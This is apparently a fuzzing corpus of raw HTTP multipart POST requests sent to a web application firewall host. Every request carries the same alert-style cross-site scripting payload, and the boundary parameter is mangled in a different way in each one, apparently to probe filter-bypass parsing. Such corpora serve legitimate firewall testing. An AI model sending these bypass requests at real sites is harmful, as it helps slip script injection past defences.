POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 953\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 45\r\nContent-Type: multipart/form-data; sboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 109\r\nContent-Type: multipart/form-data; boundaky=bouHary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 173\r\nContent-Type: multipart/form-data; :boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 237\r\nContent-Type: multipart/form-data; bouendary=boundarybound3ary\xc2\xabbo8ndarybou2day;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 301\r\nContent-Type: multipart/form-data; boundarboundryboundary=bounarEy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 365\r\nContent-Type: multipart/form-data; =====;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 429\r\nContent-Type: multipart/form-data; boundar2ybou:yboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 493\r\nContent-Type: multipart/form-data; boundary=boundarybounJdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 557\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 621\r\nContent-Type: multipart/form-data; bou\x18nVary=boud@ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 685\r\nContent-Type: multipart/form-data; boundarybondy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 749\r\nContent-Type: multipart/form-data; Woundary=bounjar0;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 813\r\nContent-Type: multipart/form-data; boundary=oundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 877\r\nContent-Type: multipart/form-data; =boundar!y=9oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 941\r\nContent-Type: multipart/form-data; bouLd*ary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 15\r\nContent-Type: multipart/form-data; boundaryboundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 79\r\nContent-Type: multipart/form-data; bo\x1endary=bo\x08undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 143\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 207\r\nContent-Type: multipart/form-data; boundarybounda\x10bou^ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 271\r\nContent-Type: multipart/form-data; boundarybounda\nryboundaryboundarybo/ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 335\r\nContent-Type: multipart/form-data; boundary==\x15oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 399\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 463\r\nContent-Type: multipart/form-data; boundarybjunday=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 527\r\nContent-Type: multipart/form-data; =k,oundaryb0oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 591\r\nContent-Type: multipart/form-data; bounaryOboundarybu;dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 655\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 719\r\nContent-Type: multipart/form-data; boundOary=boudar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 783\r\nContent-Type: multipart/form-data; bH]ndarboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 847\r\nContent-Type: multipart/form-data; -ounda+rybounary=bundar*y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 911\r\nContent-Type: multipart/form-data; boundary&5ounda\x10r0yboundaryboundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 975\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 12\r\nContent-Type: multipart/form-data; IbouGnd\x12ry=b\x02undar/;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 76\r\nContent-Type: multipart/form-data; ==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 140\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 204\r\nContent-Type: multipart/form-data; boundiarybou%dary=8bondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 268\r\nContent-Type: multipart/form-data; boudarybhoundary===%ounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 332\r\nContent-Type: multipart/form-data; boudary=MoundaYy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 396\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 460\r\nContent-Type: multipart/form-data; bounda=2boundar:y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 524\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 588\r\nContent-Type: multipart/form-data; boundary=boundarytou1ndry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 652\r\nContent-Type: multipart/form-data; boundary=buundarl;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 716\r\nContent-Type: multipart/form-data; bou\x11ndaryboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 780\r\nContent-Type: multipart/form-data; boundary=bo;undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 844\r\nContent-Type: multipart/form-data; ====b&ouh@dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 908\r\nContent-Type: multipart/form-data; boundarybo\x11d)a\xc2\xabry=bo;ndarny;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 972\r\nContent-Type: multipart/form-data; boundary=boundajy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 37\r\nContent-Type: multipart/form-data; \x00ZoundQ8rOy=ounCdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 101\r\nContent-Type: multipart/form-data; boundaryb7undarybou\x1ddry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 165\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 229\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 293\r\nContent-Type: multipart/form-data; bondary="ounday=bouXdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 357\r\nContent-Type: multipart/form-data; b\x14oundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 421\r\nContent-Type: multipart/form-data; boundaryb\x7f&Dda?bou\x01ndarU;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 485\r\nContent-Type: multipart/form-data; boundarJy==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 549\r\nContent-Type: multipart/form-data; boundaryb\toundary\x01bVBndaryboun=dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 613\r\nContent-Type: multipart/form-data; bIoundary==boundjKry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 677\r\nContent-Type: multipart/form-data; boudar|bouldar\x05boun?aryboundaryboundar/;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 741\r\nContent-Type: multipart/form-data; bbundaryboundary=yboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 805\r\nContent-Type: multipart/form-data; bcund=ryb\x00o1undry=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 869\r\nContent-Type: multipart/form-data; bjundary==bo\rudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 933\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 997\r\nContent-Type: multipart/form-data; bo\x19ndaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 29\r\nContent-Type: multipart/form-data; |ouEndar===boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 93\r\nContent-Type: multipart/form-data; boudaryb\x07\x0boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 157\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 221\r\nContent-Type: multipart/form-data; bounaYy=boulndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 285\r\nContent-Type: multipart/form-data; =bo"dunr\x06boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 349\r\nContent-Type: multipart/form-data; bodary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 413\r\nContent-Type: multipart/form-data; ===bo\x06+ar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 477\r\nContent-Type: multipart/form-data; ounZdaryb#undarybo\x1fundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 541\r\nContent-Type: multipart/form-data; b#un\x01d\x1cary=bjundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 605\r\nContent-Type: multipart/form-data; bondary=boundar\x0cy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 669\r\nContent-Type: multipart/form-data; boDundary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 733\r\nContent-Type: multipart/form-data; =bou\x01ndary=bou&\x0cdarLy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 797\r\nContent-Type: multipart/form-data; =boun*\xc2\xbba9==Qoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 861\r\nContent-Type: multipart/form-data; bou\x1eBdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 925\r\nContent-Type: multipart/form-data; boundary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 989\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 19\r\nContent-Type: multipart/form-data; bou\x0end\x1dary=bfInJayHbounda\ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 83\r\nContent-Type: multipart/form-data; b\xc2\xabunday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 147\r\nContent-Type: multipart/form-data; b;oPndary===bouda\x7fuy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 211\r\nContent-Type: multipart/form-data; bounda*ybo5sndHry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 275\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 339\r\nContent-Type: multipart/form-data; boundary=rundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 403\r\nContent-Type: multipart/form-data; boundary=bo~rn2dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 467\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 531\r\nContent-Type: multipart/form-data; boun\x10daryboundarybondrw.;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 595\r\nContent-Type: multipart/form-data; bounda6\x01\x17=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 659\r\nContent-Type: multipart/form-data; bon-ry==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 723\r\nContent-Type: multipart/form-data; boundary{onQda;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 787\r\nContent-Type: multipart/form-data; io/dary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 851\r\nContent-Type: multipart/form-data; boundaryoundary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
